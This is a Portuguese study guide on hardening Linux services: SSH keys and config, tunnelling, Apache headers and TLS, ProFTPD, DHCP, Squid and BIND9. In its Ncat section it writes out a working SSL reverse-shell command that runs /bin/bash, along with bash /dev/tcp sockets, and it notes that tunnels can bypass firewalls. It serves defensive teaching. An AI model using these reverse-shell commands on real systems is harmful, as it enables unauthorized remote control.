## 📌 **1. Introdução e Propósito**

### **Contexto**
- **Foco**: Hardening de aplicações e serviços em servidores Linux.
- **Tópicos principais**: SSH, Ncat, Tunelamento SSH, Apache Web Server, DHCP, Proxy, DNS.
- **Objetivo**: Capacitar profissionais de TI para **garantir segurança, estabilidade e eficiência** em infraestruturas Linux.

### **Abordagem**
- **Segurança em conexões remotas** (SSH).
- **Ferramentas de rede** (Ncat/Netcat, OpenSSL, Bash).
- **Configuração e hardening de servidores Web** (Apache).
- **Serviços de rede essenciais** (DHCP, Proxy, DNS).

---

## 🛡️ **2. Hardening em Sistemas Operacionais Linux – Parte 1**

### **🔐 Secure Shell (SSH)**
- **Definição**: Protocolo para acesso remoto seguro em redes inseguras.
- **Componentes**:
  1. **SSH-TRANS** (Transporte): Autenticação, confidencialidade, integridade.
  2. **SSH-USERAUTH** (Autenticação de usuário).
  3. **SSH-CONNECT** (Conexão): Multiplexação de canais lógicos.

### **Autenticação SSH**
- **Chaves públicas/privadas**: Mais segura que usuário/senha.
- **Desabilitar autenticação por senha** (`PasswordAuthentication no`) para evitar força bruta.
- **Gerar chaves**:
  ```bash
  ssh-keygen
  ssh-copy-id -i id_rsa.pub user@server
  ```
- **Arquivos importantes**:
  - Chaves do servidor: `/etc/ssh/sshd_config`
  - Chaves do cliente: `~/.ssh/id_rsa`, `~/.ssh/authorized_keys`

### **Transferência de Arquivos com SFTP/SCP**
- **SFTP**: Protocolo seguro sobre SSH.
- **SCP**: Copia segura de arquivos.
  ```bash
  scp arquivo user@server:/caminho
  scp -r diretorio user@server:/caminho
  ```

### **Shells Remotos**
- **Bind Shell**: Cliente conecta ao servidor para executar comandos no servidor.
- **Reverse Shell**: Servidor conecta ao cliente para executar comandos no cliente (contorna firewalls).

### **Tunelamento SSH (Port Forwarding)**
- **Local Port Forward**: Redireciona porta local para serviço remoto.
  ```bash
  ssh -L localhost:9090:server:22 user@server
  ```
- **Reverse Port Forward**: Expõe serviço local para rede remota.
- **Dynamic Port Forward (SOCKS Proxy)**:
  ```bash
  ssh -D 127.0.0.1:1080 user@server
  ```
- **Aplicações**: Bypass de firewall, acesso a redes internas, anonimização.

---

## 🛠️ **3. Ncat: Ferramenta de Rede Avançada**

### **O que é?**
- Sucessor do Netcat, com suporte a SSL, scripts e mais recursos.

### **Funcionalidades**
- **Scan de portas**:
  ```bash
  ncat -nv 192.168.1.1 80
  ```
- **Banner Grabbing**: Identifica serviços e versões.
- **Transferência de arquivos**:
  ```bash
  # Servidor:
  ncat -lvnp 8080 > arquivo
  # Cliente:
  cat arquivo | ncat -vn server 8080
  ```
- **Shell Reverso com SSL**:
  ```bash
  # Servidor:
  ncat --ssl -lvnp 4444
  # Cliente:
  ncat --ssl -e /bin/bash server 4444
  ```

### **Bash Sockets**
- Bash pode emular funções de rede:
  ```bash
  echo -n < /dev/tcp/server/80 && echo "Porta aberta"
  exec 3<> /dev/tcp/server/80
  echo "GET /" >&3
  cat <&3
  ```

---

## 🌐 **4. Hardening em Sistemas Operacionais Linux – Parte 2**

### **Tunelamento SSH Avançado**
- **Encadeamento de túneis** para alcançar redes internas.
  ```bash
  ssh -L 9091:host3:22 user@host1 -p 9090 -A
  ```
- **Acesso a Web Servers internos** via SSH Tunneling.

### **Controles SSH**
- **Arquivo de configuração**: `/etc/ssh/sshd_config`
- **Ajustes importantes**:
  ```bash
  PermitRootLogin no
  Port 2222
  AllowUsers user1 user2
  PasswordAuthentication no
  ```

---

## 🖥️ **5. Apache HTTP Server Hardening**

### **Instalação e Controle Básico**
- Instalação no Debian:
  ```bash
  sudo apt install apache2
  sudo systemctl enable apache2
  ```
- **Portas padrão**: 80 (HTTP), 443 (HTTPS).
- **Diretórios**:
  - Raiz Web: `/var/www/html`
  - Configuração: `/etc/apache2/apache2.conf`
  - Logs: `/var/log/apache2/`

### **Proteção Contra Banner Grabbing**
- **Ocultar versão do Apache**:
  ```apache
  ServerTokens Prod
  ServerSignature Off
  TraceEnable Off
  ```

### **Configurações de Diretórios**
- **Desabilitar listagem de diretórios**:
  ```apache
  Options -Indexes
  ```
- **Restringir acesso**:
  ```apache
  Order deny,allow
  Deny from all
  ```
- **Desabilitar .htaccess**:
  ```apache
  AllowOverride None
  ```

### **Desabilitar Recursos Perigosos**
- **SSI e CGI**:
  ```apache
  Options -Includes -ExecCGI
  ```
- **Limitar tamanho de requisições** (contra DoS):
  ```apache
  LimitRequestBody 512000
  ```

### **Segurança Avançada**
- **Headers de segurança**:
  ```apache
  Header edit Set-Cookie ^(.*)$ $1;HttpOnly;Secure
  Header always append X-Frame-Options SAMEORIGIN
  Header set X-XSS-Protection "1; mode=block"
  ```
- **Forçar HTTPS**:
  ```apache
  RewriteEngine On
  RewriteCond %{HTTPS} off
  RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
  ```
- **Configurações TLS**:
  ```apache
  SSLProtocol -all +TLSv1.2
  SSLCipherSuite HIGH:!aNULL:!MD5:!RC4
  ```

### **Módulo de Segurança (mod_security)**
- Instalação:
  ```bash
  apt install libapache2-mod-security2
  a2enmod security2
  ```

---

## 📡 **6. ProFTP com TLS**

### **Instalação e Configuração**
- Instalação:
  ```bash
  apt install proftpd openssl
  ```
- **Certificado autoassinado**:
  ```bash
  openssl req -x509 -nodes -newkey rsa:2048 -keyout proftpd.pem -out proftpd.pem -days 365
  ```
- **Habilitar TLS no ProFTPD**:
  ```apache
  TLSEngine on
  TLSProtocol TLSv1.2
  TLSRSACertificateFile /etc/ssl/private/proftpd.pem
  ```

---

## 🌍 **7. Hardening em Sistemas Operacionais Linux – Parte 3**

### **DHCP (Dynamic Host Configuration Protocol)**
- **Função**: Distribuir IPs e configurações de rede automaticamente.
- **Instalação**:
  ```bash
  apt install isc-dhcp-server
  ```
- **Arquivo de configuração**: `/etc/dhcp/dhcpd.conf`
- **Exemplo de pool**:
  ```apache
  subnet 192.168.60.0 netmask 255.255.255.0 {
    range 192.168.60.50 192.168.60.100;
    option routers 192.168.60.1;
    option domain-name-servers 8.8.8.8;
  }
  ```
- **IPs reservados**:
  ```apache
  host servidor {
    hardware ethernet 00:0c:19:bc:2e:e1;
    fixed-address 192.168.60.7;
  }
  ```
- **Logs**: `/var/log/syslog`

### **Proxy Squid**
- **Instalação**:
  ```bash
  apt install squid
  ```
- **Arquivo de configuração**: `/etc/squid/squid.conf`
- **Configurações básicas**:
  ```apache
  http_port 3128
  visible_hostname proxy.local
  cache_mem 64 MB
  ```
- **Autenticação**:
  ```bash
  htpasswd -c /etc/squid/passwd usuario
  ```
- **Logs**: `/var/log/squid/`

### **DNS BIND9**
- **Instalação**:
  ```bash
  apt install bind9 bind9-doc dnsutils
  ```
- **Zonas DNS**:
  - **Direta**: Nome → IP.
  - **Reversa**: IP → Nome.
- **Arquivos principais**:
  - `/etc/bind/named.conf`
  - `/etc/bind/db.dominio` (zona direta)
  - `/etc/bind/db.reverso` (zona reversa)
- **Exemplo de zona direta** (`db.curso.local`):
  ```bind
  @ IN SOA ns.curso.local. admin.curso.local. (20240101 8H 2H 4W 1D)
  @ IN NS ns.curso.local.
  ns IN A 192.168.60.100
  www IN CNAME servidor.curso.local.
  ```
- **Consulta recursiva**:
  ```bind
  options {
    allow-recursion { localhost; 192.168.60.0/24; };
  }
  ```
- **Testes**:
  ```bash
  nslookup servidor.curso.local
  host 192.168.60.100
  ```

---

## ✅ **8. Conclusão e Referências**

### **Pontos-chave de Hardening Linux**
1. **SSH**: Use chaves, desative senhas, controle acessos.
2. **Apache**: Oculte banners, restrinja diretórios, use HTTPS.
3. **Serviços de Rede** (DHCP, Proxy, DNS):
   - Configure corretamente os arquivos de configuração.
   - Monitore logs.
   - Implemente autenticação e criptografia.
4. **Ferramentas** (Ncat, OpenSSL, Bash):
   - Conheça para defender e monitorar.

### **Referências Recomendadas**
- **OpenSSH Security and Hardening** – Linux Audit.
- **Apache Web Server Hardening Guide** – Geek Flare.
- **Documentação oficial** Debian, Squid, BIND9.
- **RFCs**: 4251 (SSH), 1928 (SOCKS).

---

## 📌 **Resumo Final**

| Serviço | Configurações Principais | Hardening Recomendado |
|---------|--------------------------|------------------------|
| **SSH** | `sshd_config`, chaves RSA | Desativar root login, usar chaves, mudar porta |
| **Apache** | `apache2.conf`, módulos | Ocultar banners, limitar diretórios, HTTPS obrigatório |
| **DHCP** | `dhcpd.conf`, pools | IPs reservados, logs ativos |
| **Squid** | `squid.conf`, portas | Autenticação, cache controlado |
| **BIND9** | `named.conf`, zonas | Consultas recursivas restritas, DNSSEC |
| **ProFTP** | `proftpd.conf`, TLS | Certificado SSL, logs de transferência |

---

## 🚀 **Próximos Passos Práticos**
1. **Configure um servidor SSH** com autenticação por chaves apenas.
2. **Instale e fortaleça um Apache** com mod_security e HTTPS.
3. **Implemente um servidor DHCP** com IPs reservados para servidores.
4. **Monitore logs** de todos os serviços com `tail -f` e ferramentas como `logwatch`.
5. **Teste a segurança** com ferramentas como `nmap`, `nikto`, `lynis`.
